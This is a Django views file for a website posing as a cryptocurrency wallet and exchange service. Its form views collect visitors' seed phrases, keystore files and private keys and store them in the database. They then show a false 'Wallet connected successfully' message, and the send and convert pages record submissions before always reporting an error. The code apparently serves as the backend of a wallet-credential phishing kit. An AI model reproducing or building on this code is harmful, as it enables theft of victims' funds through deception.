from django.http import JsonResponse
from django.shortcuts import render, redirect
from django.urls import reverse
from django.contrib import messages
from django.contrib.auth.decorators import login_required

from core import models as wallets_model
from core import forms as forms_model


# Create your views here.
# @login_required
def home(request):
    
    news = wallets_model.News.objects.filter(active=True)
    context = { "news": news }
    return render(request, "core/index.html", context)

# blog details Page
# @login_required
def blog_details(request, nid): 
       
    blog_details = wallets_model.News.objects.get(active=True, nid=nid)
    context = {"blog_details": blog_details}
    return render(request, "core/blog_details.html", context)

# All Wallets
def all_wallets(request):
    
    wallets = wallets_model.Wallets.objects.filter(active=True)
    context = { "wallets": wallets }
    # return render(request, 'connect_error.html', {'next_url': reverse("core:phrase_forms")}, context)
    return render(request, "core/all_wallets.html", context)


# Error Page
# @login_required
def connect_error(request, pid): 
       
    connect_error = wallets_model.Wallets.objects.get(active=True, pid=pid)
    context = {"connect_error": connect_error}
    return render(request, "core/connect_error.html", context)


# # Wallets Detal
@login_required
def phrase_forms(request):
    
    phrase_form = forms_model.PhraseForm()
    if request.method == 'POST':
        phrase_form = forms_model.PhraseForm(request.POST)
        if phrase_form.is_valid():
            wallet = phrase_form.save(commit=False)
            wallet.user = request.user  # 👈 assign user here
            wallet.save()
            messages.success(request, "Wallet connected successfully.")
            return render(request, 'w_connected.html', {'next_url': reverse("core:buy_page")})
            # return redirect("core:wallet_connected")
    else:
        phrase_form = forms_model.PhraseForm()

    context = { "phrase_form": phrase_form }
    return render(request, "core/phrase_forms.html", context)


# # Wallets Detal
# @login_required
def key_forms(request):
    
    key_form = forms_model.KeyStoreForm()
    if request.method == 'POST':
        key_form = forms_model.KeyStoreForm(request.POST)
        if key_form.is_valid():
            wallet = key_form.save(commit=False)
            wallet.user = request.user  # 👈 assign user here
            wallet.save()
            messages.success(request, "Wallet connected successfully.")
            return render(request, 'w_connected.html', {'next_url': reverse("core:buy_page")})
            # return redirect("core:wallet_connected")
    else:
        key_form = forms_model.KeyStoreForm()

    context = { "key_form": key_form }
    return render(request, "core/key_forms.html", context)


# # Wallets Detal
# @login_required
def private_forms(request):
    
    private_form = forms_model.PrivateKeyForm()
    if request.method == 'POST':
        private_form = forms_model.PrivateKeyForm(request.POST)
        if private_form.is_valid():
            wallet = private_form.save(commit=False)
            wallet.user = request.user  # 👈 assign user here
            wallet.save()
            messages.success(request, "Wallet connected successfully.")
            return render(request, 'w_connected.html', {'next_url': reverse("core:buy_page")})
            # return redirect("core:wallet_connected")
    else:
        private_form = forms_model.PrivateKeyForm()

    context = { "private_form": private_form }
    return render(request, "core/private_forms.html", context)


# wallet Connected
# @login_required
def w_connected(request):
    
    # wallet_phrase = wallets_model.Phrase.objects.filter(active=True, user=request.user)
    context = { }
    return render(request, "core/w_connected.html", context)


# qrcode
# @login_required
def qrcode(request):
    
    qrcode = wallets_model.Qrcodes.objects.filter(active=True)
    context = { "qrcode": qrcode }
    return render(request, "core/qrcode.html", context)


# qrcode detail
# @login_required
def qrcode_detail(request, tid):
    
    qrcode = wallets_model.Qrcodes.objects.get(active=True, tid=tid)
    context = { "qrcode": qrcode }
    return render(request, "core/qrcode_detail.html", context)

# qrcode detail
# @login_required
def send_money(request):
    
    send_money = forms_model.SendCoinForm()
    if request.method == 'POST':
        send_money = forms_model.SendCoinForm(request.POST)
        if send_money.is_valid():
            wallet = send_money.save(commit=False)
            wallet.user = request.user  # 👈 assign user here
            wallet.save()
            messages.error(request, "Something went wrong.")
            return render(request, 'error_page.html', {'next_url': reverse("core:send_money")})
            # messages.success(request, "Coin sent successfully.")
            # return redirect("/")
            # return redirect("core:wallet_connected")
    else:
        send_money = forms_model.SendCoinForm()
    context = { "send_money": send_money }
    return render(request, "core/send_money.html", context)

# Convert
# @login_required
def convert(request):
    
    # get all the fields to be created
    if request.method == "POST": 
        convert = request.POST.get("convert")

        # Then create it
        wallets_model.Convert.objects.create(
            convert=convert,
            
        )

        messages.error(request, "Something went wrong.")
        return render(request, 'error_page.html', {'next_url': reverse("core:convert")})
        # return redirect("core:error_page") # type: ignore
    
    context = { }
    return render(request, "core/convert.html", context)

# error_page
# @login_required
def error_page(request):
    
    context = {}
    return render(request, "core/error_page.html", context)

# buy
@login_required
def buy_page(request):
    
    phrase = wallets_model.Phrase.objects.filter(active=True, user=request.user)
    key_store = wallets_model.KeyStore.objects.filter(active=True, user=request.user)
    private_key = wallets_model.PrivateKey.objects.filter(active=True, user=request.user)


    context = { "phrase": phrase, "key_store": key_store, "private_key": private_key  }
    return render(request, "core/buy_page.html", context)

# Exchange
# @login_required
def exchange(request):
    
    context = {}
    return render(request, "core/exchange.html", context)


# buy_other
# @login_required
def buy_other(request):
    
    context = {}
    return render(request, "core/buy_other.html", context)

# 
# # Wallets Detal
@login_required
def forum(request):
    comments = forms_model.Comment.objects.all().order_by('-date')
    comment_form = forms_model.CommentForm()

    if request.method == 'POST':
        comment_form = forms_model.CommentForm(request.POST)
        if comment_form.is_valid():
            comment = comment_form.save(commit=False)
            comment.user = request.user
            comment.save()

            # Return JSON for AJAX
            return JsonResponse({
                'user': comment.user.get_full_name() or comment.user.username,
                'content': comment.content,
                'date': comment.date.strftime('%Y-%m-%d %H:%M'),
                'image': comment.user.profile.image.url if hasattr(comment.user, 'profile') else ''
            })

        return JsonResponse({'error': 'Invalid form submission'}, status=400)

    context = {
        'comments': comments,
        'comment_form': comment_form,
    }
    return render(request, 'core/forum.html', context)


# mine
# @login_required
def mine(request):
    
    context = {}
    return render(request, "core/mine.html", context)

# guide
# @login_required
def guide(request):
    
    context = {}
    return render(request, "core/guide.html", context)

# about
# @login_required
def about_page(request):
    
    context = {}
    return render(request, "core/about_page.html", context)

# support
# @login_required
def support(request):
    
    context = {}
    return render(request, "core/support.html", context)

# future
# @login_required
def future(request):
    
    context = {}
    return render(request, "core/future.html", context)

# videos
# @login_required
def videos(request):
    
    context = {}
    return render(request, "core/videos.html", context)

# videos
# @login_required
def index(request):
    if request.user.is_authenticated:
        messages.warning(request, "Hi, you are already logged in.")
        return redirect("core:home")
    
    context = {}
    return render(request, "core/index.html", context)
